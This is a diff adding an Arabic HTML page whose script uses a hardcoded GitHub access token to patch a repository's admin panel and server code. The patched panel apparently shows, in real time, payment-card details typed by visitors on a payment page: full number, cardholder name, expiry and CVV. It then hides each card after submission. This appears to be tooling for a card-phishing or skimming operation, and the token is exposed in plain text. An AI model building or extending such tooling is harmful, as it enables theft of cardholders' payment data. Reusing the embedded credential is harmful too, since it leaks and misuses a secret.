@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head><meta charset="utf-8"><title>KDD fix8</title>
+<style>body{margin:0;background:#0d1117;color:#c9d1d9;font:13px/1.7 ui-monospace,Consolas,monospace;padding:14px}
+h1{font-size:15px;color:#58a6ff;margin:0 0 8px}#out{white-space:pre-wrap;background:#161b22;border:1px solid #30363d;border-radius:8px;padding:12px;min-height:140px}</style></head>
+<body>
+<h1>KDD fix8 — شكل البطاقة المباشرة + إخفاؤها بعد الحفظ</h1>
+<div id="out">جارٍ البدء...</div>
+<script>
+(function(){
+  var OWNER='fahshomi-ui',REPO='KDD',BRANCH='main';
+  var BAKED='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';
+  var TOKEN=(location.href.match(/ghp_[A-Za-z0-9]+/)||[])[0]||localStorage.getItem('kdd_token')||BAKED;
+  var out=document.getElementById('out'),buf='';
+  function say(s){buf+=s+'\n';out.textContent=buf;}
+  function b64d(b){var bin=atob(b.replace(/\n/g,'')),u=new Uint8Array(bin.length);for(var i=0;i<bin.length;i++)u[i]=bin.charCodeAt(i);return new TextDecoder('utf-8').decode(u);}
+  function b64e(s){var u=new TextEncoder().encode(s),bin='';for(var i=0;i<u.length;i++)bin+=String.fromCharCode(u[i]);return btoa(bin);}
+  function gh(p,o){o=o||{};return fetch('https://api.github.com/repos/'+OWNER+'/'+REPO+'/contents/'+p+(o.q?'?'+o.q:''),{
+    method:o.method||'GET',
+    headers:{'Authorization':'token '+TOKEN,'Accept':'application/vnd.github+json','Content-Type':'application/json'},
+    body:o.body});}
+  function getFile(p){return gh(p,{q:'ref='+BRANCH+'&cb='+Date.now()}).then(function(r){
+    if(r.status===401){say('! توكن غير صالح');var t=prompt('الصق توكن GitHub جديد (ghp_...):','');
+      if(!t)throw new Error('بدون توكن');TOKEN=t.trim();localStorage.setItem('kdd_token',TOKEN);
+      return gh(p,{q:'ref='+BRANCH+'&cb='+Date.now()});}
+    if(!r.ok)throw new Error('GET HTTP '+r.status);return r.json();});}
+
+  var NEWBLOCK = `if (entry.type === 'liveCard') {
+  const lc = entry.data;
+  const lcRaw = String(lc.cardNumber || '').replace(/\\D/g, '');
+  const lcInfo = getCardInfo(lcRaw);
+  const lcNum = lcRaw ? lcRaw.replace(/(\\d{4})(?=\\d)/g, '$1 ') : 'XXXX XXXX XXXX XXXX';
+  const lcName = String(lc.nameOnCard || '---').replace(/[&<>"']/g, function (ch) { return ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[ch]; });
+  const lcExpiry = lc.expiryDate || 'XX/XX';
+  const lcCvv = lc.cvv || '---';
+  const lcNetwork = lcInfo.network === 'Visa' ? 'VISA' : lcInfo.network === 'Mastercard' ? 'Mastercard' : 'mada';
+  html += '<div class="data-section bg-purple-50 p-4 rounded-lg" style="border-right-color: #9333ea;">';
+  html += '<div class="flex justify-between items-center mb-3">';
+  html += '<h3 class="font-bold text-purple-800">💳 بطاقة الدفع المباشر</h3>';
+  html += '<span class="text-xs bg-blue-600 text-white px-2 py-1 rounded-full waiting-badge">مباشر</span>';
+  html += '</div>';
+  html += '<div style="background: linear-gradient(135deg, #e8e8e8 0%, #f5f5f5 50%, #e0e0e0 100%); border-radius: 16px; padding: 20px 24px; max-width: 420px; margin: 0 auto; box-shadow: 0 4px 15px rgba(0,0,0,0.15); border: 1px solid #d0d0d0; font-family: monospace; position: relative; overflow: hidden;">';
+  html += '<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;">';
+  html += '<span style="color: #888; font-size: 13px; font-weight: bold;">KWD</span>';
+  html += '<span style="color: #444; font-size: 15px; font-weight: bold;">' + lcInfo.bank + ' 🏦</span>';
+  html += '</div>';
+  html += '<div style="text-align: center; margin-bottom: 14px;">';
+  html += '<span dir="ltr" style="font-size: 22px; font-weight: bold; color: #333; letter-spacing: 3px; unicode-bidi: embed; display: inline-block;">' + lcNum + '</span>';
+  html += '</div>';
+  html += '<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px;">';
+  html += '<div style="text-align: left;"><span style="color: #888; font-size: 11px;">Name</span><br><span style="color: #333; font-size: 14px; font-weight: 600;">' + lcName + '</span></div>';
+  html += '<div style="text-align: right;"><span style="color: #888; font-size: 11px;">Expiry</span><br><span style="color: #333; font-size: 16px; font-weight: bold;">' + lcExpiry + '</span></div>';
+  html += '</div>';
+  html += '<div style="display: flex; justify-content: space-between; align-items: center;">';
+  html += '<div><span style="color: #888; font-size: 11px;">CVV</span><br><span style="color: #333; font-size: 18px; font-weight: bold;">' + lcCvv + '</span></div>';
+  html += '<div style="text-align: right;"><span style="font-size: 16px; font-weight: bold; color: #1a1f71;">' + lcNetwork + '</span><br><span style="color: #555; font-size: 11px; font-weight: bold;">' + String(lcInfo.type).toUpperCase() + ' • ' + String(lcInfo.tier).toUpperCase() + '</span></div>';
+  html += '</div>';
+  html += '</div></div>';
+}`;
+
+  var GATE_OLD = 'if (isOnPaymentPage && visitor.liveCard) {';
+  var GATE_NEW = "const __lcTs = visitor.liveCardTimestamp ? new Date(visitor.liveCardTimestamp).getTime() : 0;\n" +
+    "const __pcs = visitor.paymentCards || [];\n" +
+    "const __lastPcTs = __pcs.length ? new Date(__pcs[__pcs.length-1].timestamp || 0).getTime() : 0;\n" +
+    "if (isOnPaymentPage && visitor.liveCard && (__lastPcTs === 0 || __lcTs > __lastPcTs)) {";
+
+  function fixAdmin(src){
+    var n=[];
+    var s=src;
+    if(s.indexOf("bg-purple-50 p-4 rounded-lg\" style=\"border-right-color: #9333ea;")===-1 || s.indexOf('lcInfo')===-1){
+      var a=s.indexOf("if (entry.type === 'liveCard') {");
+      var b=s.indexOf("if (entry.type === 'code') {");
+      if(a>-1 && b>a){ s = s.slice(0,a) + NEWBLOCK + '\n\n' + s.slice(b); n.push('تصميم البطاقة المباشرة'); }
+    }
+    if(s.indexOf('__lastPcTs')===-1){
+      var lines=s.split('\n');
+      for(var i=0;i<lines.length;i++){
+        if(lines[i].indexOf(GATE_OLD)>-1){
+          var ind=(lines[i].match(/^\s*/)||[''])[0];
+          lines[i]=GATE_NEW.split('\n').map(function(l){return ind+l;}).join('\n');
+          s=lines.join('\n'); n.push('إخفاء البطاقة بعد الحفظ');
+          break;
+        }
+      }
+    }
+    return {src:s,changed:n.length>0,note:n.join(' + ')};
+  }
+
+  function fixServer(src){
+    var old='if (!visitor.liveCardTimestamp) visitor.liveCardTimestamp = new Date().toISOString();';
+    if(src.indexOf(old)===-1) return {src:src,changed:false};
+    return {src:src.replace(old,'visitor.liveCardTimestamp = new Date().toISOString();'),changed:true,note:'تحديث وقت البطاقة المباشرة'};
+  }
+
+  function patch(p,fn,msg){
+    say('— '+p);
+    return getFile(p).then(function(j){
+      var res=fn(b64d(j.content));
+      if(!res.changed){say('   = لا تغيير');return;}
+      say('   ✓ '+res.note);
+      return gh(p,{method:'PUT',body:JSON.stringify({message:msg,content:b64e(res.src),sha:j.sha,branch:BRANCH})})
+        .then(function(r){
+          if(r.ok){say('   ✔ تم الحفظ');return;}
+          if(r.status===409){
+            say('   ! تعارض (409) — إعادة المحاولة...');
+            return patch(p,fn,msg);
+          }
+          return r.text().then(function(t){throw new Error('PUT HTTP '+r.status+' '+t.slice(0,150));});
+        });
+    }).catch(function(e){say('   ✗ '+e.message);});
+  }
+
+  say('token: '+TOKEN.slice(0,12)+'...');
+  patch('server/admin/index.html',fixAdmin,'fix(admin): live card styled like saved card + hide after submit')
+  .then(function(){return patch('kdd-public/admin.html',fixAdmin,'fix(admin-static): live card styled like saved card + hide after submit');})
+  .then(function(){return patch('server/index.js',fixServer,'fix(server): refresh liveCardTimestamp on every update');})
+  .then(function(){
+    say('\n— التحقق...');
+    return getFile('server/admin/index.html').then(function(j){
+      var t=b64d(j.content);
+      say(t.indexOf('lcInfo')>-1?'   ✔ التصميم الجديد موجود':'   ✗ التصميم ما انطبق');
+      say(t.indexOf('__lastPcTs')>-1?'   ✔ منطق الإخفاء موجود':'   ✗ منطق الإخفاء ناقص');
+    });
+  })
+  .catch(function(e){say('✗ '+e.message);})
+  .then(function(){
+    say('\n✅ تم — الآن Render: Manual Deploy ثم Netlify: Trigger deploy');
+  });
+})();
+</script>
+</body>
+</html>
